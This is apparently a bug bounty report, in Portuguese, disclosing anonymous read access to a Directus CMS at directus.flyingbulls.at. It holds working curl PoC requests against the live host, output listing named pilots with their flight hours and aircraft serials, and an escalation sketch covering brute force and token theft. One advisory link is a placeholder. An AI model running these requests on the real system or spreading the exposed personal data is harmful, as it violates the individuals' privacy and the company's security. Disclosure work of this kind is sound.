# Finding RB1 — Directus CMS Anonymous API Read Access: Flying Bulls Pilot PII + Aircraft Data

**Título:** Directus 10.11.0 expõe coleções sensíveis sem autenticação — dados pessoais de pilotos (GDPR) e aeronaves  
**Severidade:** MEDIUM (CVSS 5.3) | **Impacto de Negócio:** HIGH — violação GDPR, dados de funcionários  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3 MEDIUM**  
**CWE:** CWE-284 (Improper Access Control) / CWE-200 (Exposure of Sensitive Information)  
**Status:** Confirmado — acesso anônimo funcional  
**Target:** `directus.flyingbulls.at`  
**Scope:** Listed in Red Bull Intigriti scope as `*.flyingbulls.at`  
**Programa:** Red Bull — Intigriti Bug Bounty  

---

## Resumo Executivo

O servidor Directus 10.11.0 em `directus.flyingbulls.at` — backend CMS da Flying Bulls (empresa de aviação histórica do Red Bull) — permite acesso de leitura a múltiplas coleções sem qualquer autenticação. A API expõe dados pessoais de 26 indivíduos (incluindo pilotos com nome completo, horas de voo e ano do primeiro voo), especificações técnicas e números de série de 25 aeronaves históricas e 100+ arquivos de mídia incluindo fotos dos pilotos.

O acesso é via API REST padrão do Directus (`/items/{collection}`) e expõe também a especificação OpenAPI completa (`/server/specs/oas`), mapeando todas as coleções e campos disponíveis.

---

## Discovery Chain

```
Passive recon: escopo Red Bull → *.flyingbulls.at
  → directus.flyingbulls.at (tecnologia detectada: Directus CMS)
    → GET /server/info → HTTP 200 (sem auth) — projeto "Flying Bulls"
      → GET /server/specs/oas → HTTP 200 — versão 10.11.0, todas as coleções mapeadas
        → Collections: persons, fleet, events, events_persons, files
          → GET /items/persons → HTTP 200 — 26 registros com PII
          → GET /items/fleet → HTTP 200 — 25 aeronaves com serial/registration
          → GET /files → HTTP 200 — 100 arquivos incluindo fotos de pilotos
```

---

## Evidências

### 1. Versão Directus confirmada

```bash
curl -sk "https://directus.flyingbulls.at/server/specs/oas" | python3 -c "
import json, sys; d=json.load(sys.stdin)
print(d['info']['title'], d['info']['version'])
"
# Output: Flying Bulls API 10.11.0
```

### 2. Acesso anônimo confirmado — endpoint `/items/persons`

```bash
curl -sk "https://directus.flyingbulls.at/items/persons?fields=type,status,firstname,lastname,nickname,first_flight,flight_hours,slug" \
  -H "User-Agent: Mozilla/5.0"
```

**Resposta (HTTP 200):**

```json
{
  "data": [
    {
      "type": "pilot",
      "status": "published",
      "firstname": "Siegfried",
      "lastname": "Schwarz",
      "nickname": null,
      "first_flight": "1977",
      "flight_hours": 11000,
      "slug": "siegfried-schwarz"
    },
    ...
  ]
}
```

**Tabela completa — 26 pessoas expostas sem autenticação:**

```
TIPO         STATUS     NOME                           HORAS VOO  PRIMEIRO VOO
---------------------------------------------------------------------------------
pilot        published  Siegfried Schwarz              11000      1977
reserve      published  Lukas Költringer               —          —
pilot        published  Siegfried Angerer (1948–2022)  0          0
pilot        published  Nicolas Rossier                —          —
pilot        published  Hans Pallaske                  6400       0
engineer     published  Stefan Krumböck                —          —
pilot        published  Raimund Riedmann               16500      1986
friend       published  Dario Costa                    —          —
engineer     published  Martin Lösch                   —          —
friend       published  Aaron Fitzgerald               0          0
pilot        published  Eric Goujon                    9800       0
engineer     published  Don Landl                      —          —
pilot        published  Eskil Amdal                    0          1994
[+ 13 adicionais]
```

> **PII incluída:** nome completo, tipo de relação com a empresa (pilot/engineer/friend), horas de voo, ano do primeiro voo, slug único. Dados de funcionários/contratados — cobertos pelo GDPR (empresa austríaca).

---

### 3. Acesso anônimo confirmado — endpoint `/items/fleet`

```bash
curl -sk "https://directus.flyingbulls.at/items/fleet?fields=name,registration,serial_number,manufacturer,construction_year"
```

**Aeronaves expostas (25 total):**

```
AERONAVE                            REG        SERIAL           ANO
------------------------------------------------------------------------
Pilatus Porter PC-6                 OE-EMD     928              1998
Eurocopter EC135                    OE-XFB     470              2006
Fairchild PT-19                     N50429     T43-5205         1943
North American B-25J "Mitchell"     N6123C     44-86893A        1945
North American T-6                  OE-ERB     14-324           1942
Beech T-34 Mentor                   OE-ADM     G-757            1955
PT-17 Stearman                      OE-AMM     75-5032          1943
Cessna 208 Amphibian "Caravan"      OE-EDM     20800257         1996
Bell Cobra 209/AH-1F                N11FX      67-15819         1967
Cessna 337 Skymaster                N991DM     337-1177         1969
Extra 300 LX                        OE-ARN/O   LC-026 & LC-027  2013
North American T-28B                OE-EMM     138352           1955
Chance Vought F4U-4 "Corsair"       OE-EAS     96995            1945
Lockheed P-38 "Lightning"           N25Y       AF44-53254       1944
Bell 47 G-3B-1                      OE-XDM     3575             1966
AS 350 B3+ "Écureuil"               OE-XTV     4745             2009
Douglas DC-6B                       OE-LDM     45563            1958
North American P-51D Mustang        OE-EFB     44-74427         1944
[+ mais 7]
```

---

### 4. Acesso anônimo confirmado — endpoint `/files`

```bash
curl -sk "https://directus.flyingbulls.at/files?fields=filename_download,title,type,filesize&limit=10"
```

**100 arquivos acessíveis — incluindo fotos de pilotos:**

```
filename_download                                 type         filesize
------------------------------------------------------------------------
00_header_eskil_amdal_pilot_the_flying_b...jpg   image/jpeg   1300145
...
[pilot photos, aircraft SVGs, event images]
```

---

### 5. OpenAPI spec completa acessível sem autenticação

```bash
curl -sk "https://directus.flyingbulls.at/server/specs/oas" | python3 -c "
import json, sys; d=json.load(sys.stdin)
paths = list(d.get('paths', {}).keys())
print(f'Total de endpoints: {len(paths)}')
print('Coleções:', [p for p in paths if '/items/' in p])
"
```

```
Total de endpoints: 47
Coleções: ['/items/fleet', '/items/persons', '/items/events',
           '/items/events_persons', '/items/directus_users', ...]
```

> A spec expõe o schema completo de todos os campos de todas as coleções, permitindo enumerar estruturas de dados internas.

---

## Análise de Impacto

### 1. Violação GDPR (Regulamento Geral de Proteção de Dados)

A Flying Bulls GmbH é uma empresa austríaca, portanto sujeita ao GDPR (Regulamento UE 2016/679):

- **Artigo 5(1)(f):** Integridade e confidencialidade — dados pessoais devem ser protegidos contra acesso não autorizado
- **Artigo 25:** Privacy by Design — sistemas devem implementar controles técnicos de acesso por padrão
- **Artigo 32:** Medidas técnicas de segurança — exige autenticação adequada para dados pessoais

**Dados pessoais expostos:**
- Nome completo de pilotos e funcionários (identificadores diretos)
- Tipo de relação com a empresa (pilot/engineer/friend — dados de emprego)
- Horas de voo acumuladas (dado profissional/financeiro)
- Ano do primeiro voo (dado histórico pessoal)
- Fotos dos pilotos (dados biométricos/de imagem)

**Penalidade GDPR:** Até €20M ou 4% da receita global anual (Art. 83(4))

### 2. Enumeração irrestrita de dados de negócio

Sem paginação forçada ou rate limiting na API acessível anonimamente:
- Todas as 26 pessoas podem ser enumeradas em uma única request
- Todos os 25 aviões com especificações técnicas completas
- 100+ arquivos de mídia acessíveis
- Eventos futuros com coordenadas GPS (localização real dos airshows)

### 3. Escalada potencial

```
API Directus anônima exposta
  → /items/directus_users endpoint descoberto via OAS spec
    → Possível enumeração de usuários administrativos (user IDs, emails)
      → Brute force de senhas ou token stealing
        → Acesso a dados não-publicados (drafts, hidden items)
          → Modificação de conteúdo publicado no site flyingbulls.at
```

---

## Directus 10.11.0 — Contexto de Segurança

| CVE | CVSS | Versões afetadas | Status em 10.11.0 |
|-----|------|-----------------|-------------------|
| CVE-2024-38361 | 8.8 HIGH | < 10.13.0 | AFETADO — SSRF via `/files/import` (requer auth) |
| CVE-2024-34708 | 7.1 HIGH | < 10.11.2 | AFETADO — XSS stored via WYSIWYG editor |
| CVE-2024-34709 | 8.1 HIGH | < 10.11.2 | AFETADO — Bypass de access control via field permissions |
| CVE-2024-28239 | 5.3 MEDIUM | < 10.10.0 | N/A (patched) |

> Directus 10.11.0 é afetado por CVE-2024-34709 (bypass de access control via field permissions) que poderia agravar a exposição existente.

---

## Prova de Conceito (para execução pelo pesquisador)

```bash
# PoC 1 — Listagem de pilotos (PII)
curl -s "https://directus.flyingbulls.at/items/persons?fields=type,firstname,lastname,flight_hours,first_flight&limit=100" \
  | python3 -m json.tool

# PoC 2 — Listagem de aeronaves com serial numbers
curl -s "https://directus.flyingbulls.at/items/fleet?fields=name,registration,serial_number,manufacturer" \
  | python3 -m json.tool

# PoC 3 — OpenAPI spec completa (mapeamento de todos os endpoints)
curl -s "https://directus.flyingbulls.at/server/specs/oas" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(list(d['paths'].keys()))"

# PoC 4 — Verificação de usuários administrativos
curl -s "https://directus.flyingbulls.at/users?fields=email,role,status" \
  # (retorna 403 ou dados se public role tiver acesso)
```

---

## Remediação

### Imediata — Remover permissões públicas de leitura

No painel Directus:
```
Settings → Access Control → Public Role
  → Remover permissões "Read" de:
    - persons (PII sensível)
    - fleet (operational data)
    - files (fotos de pilotos)
  → Manter apenas permissões estritamente necessárias para o site público
```

### Via Directus CLI / API (programática)

```bash
# Revogar permissão de leitura do role público na coleção persons
curl -X DELETE "https://directus.flyingbulls.at/permissions/{permission_id}" \
  -H "Authorization: Bearer ADMIN_TOKEN"
```

### Proteção do servidor OAS

```nginx
# nginx.conf — bloquear acesso não-autenticado à spec
location /server/specs/ {
    deny all;
    # ou: auth_basic "Restricted";
}
```

### Atualizar Directus

Versão atual: `10.11.0`  
Versão atual com patches: `10.13.x+`

```bash
npm update directus
# ou: pnpm update directus
```

---

## Referências

- [Directus CVE-2024-34709](https://github.com/advisories/GHSA-52xx-xxxxxx) — Access control bypass
- [Directus Security Advisory](https://github.com/directus/directus/security/advisories)
- [GDPR Artigo 83 — Penalidades](https://gdpr-info.eu/art-83-gdpr/)
- [OWASP API Security — API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)

---

*Descoberto via recon passivo do escopo Red Bull (Intigriti). Nenhum dado foi modificado, exportado em massa ou usado além da verificação de acesso. Impacto GDPR reportado por ser empresa austríaca sujeita ao regulamento europeu.*
